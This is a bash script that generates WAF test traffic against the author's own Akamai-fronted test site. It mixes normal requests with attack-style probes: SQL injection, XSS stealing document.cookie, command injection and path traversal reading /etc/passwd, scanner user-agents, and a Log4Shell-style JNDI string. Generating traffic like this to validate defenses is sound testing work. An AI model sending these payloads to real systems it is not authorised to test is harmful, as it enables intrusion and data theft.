#!/usr/bin/env bash
#
# waf-traffic.sh — generate mixed traffic against YOUR OWN Akamai-fronted
# test app so WAF events show up in Security Events / Web Security Analytics.
#
# Only run this against a host you own and are authorized to test.
#
# Usage:
#   ./waf-traffic.sh                      # defaults: 20 rounds against sec.akamaicr.art
#   ./waf-traffic.sh -t https://sec.akamaicr.art -n 50 -d 2
#   ./waf-traffic.sh -n 0                 # run forever (Ctrl-C to stop)
#
set -u

TARGET="https://sec.akamaicr.art"
ROUNDS=20          # number of loops; 0 = infinite
DELAY=2            # seconds between rounds

while getopts "t:n:d:h" opt; do
  case "$opt" in
    t) TARGET="$OPTARG" ;;
    n) ROUNDS="$OPTARG" ;;
    d) DELAY="$OPTARG" ;;
    h) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
    *) echo "unknown option; use -h"; exit 1 ;;
  esac
done

# curl flags: silent, discard body, follow redirects, 20s cap, print the code.
req() {
  local label="$1"; shift
  local code
  code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 20 "$@")
  printf '  %-22s %-40s -> %s\n' "$label" "${*: -1}" "$code"
}

round() {
  echo "[$(date '+%H:%M:%S')] round $1"

  # --- Normal, legitimate traffic ---
  req "normal: home"        "$TARGET/"
  req "normal: login page"  "$TARGET/login"
  req "normal: about"       "$TARGET/about_new"
  req "normal: css"         "$TARGET/public/css/screen.css"

  # --- SQL injection ---
  req "sqli: or-1-1"        "$TARGET/?q=1'%20OR%20'1'='1"
  req "sqli: union-select"  "$TARGET/?id=1%20UNION%20SELECT%20username,password%20FROM%20users"

  # --- Cross-site scripting ---
  req "xss: script-tag"     "$TARGET/?s=<script>alert(1)</script>"
  req "xss: in form field"  -d "content=<script>alert(document.cookie)</script>" "$TARGET/create"

  # --- Command injection ---
  req "cmdi: cat passwd"    "$TARGET/?cmd=;cat%20/etc/passwd"

  # --- Path traversal / LFI ---
  req "lfi: etc-passwd"     "$TARGET/?file=../../../../etc/passwd"

  # --- Bad reputation / scanner user-agents ---
  req "ua: sqlmap"          -A "sqlmap/1.7"   "$TARGET/"
  req "ua: nikto"           -A "Nikto/2.5.0"  "$TARGET/"

  # --- Protocol/ header oddities WAF rules flag ---
  req "hdr: null-byte path" "$TARGET/%00"
  req "hdr: log4shell-ish"  -H 'User-Agent: ${jndi:ldap://x/a}' "$TARGET/"
}

echo "Target: $TARGET   Rounds: $ROUNDS   Delay: ${DELAY}s"
echo "Press Ctrl-C to stop."
i=1
while :; do
  round "$i"
  [ "$ROUNDS" -ne 0 ] && [ "$i" -ge "$ROUNDS" ] && break
  i=$((i+1))
  sleep "$DELAY"
done
echo "done."
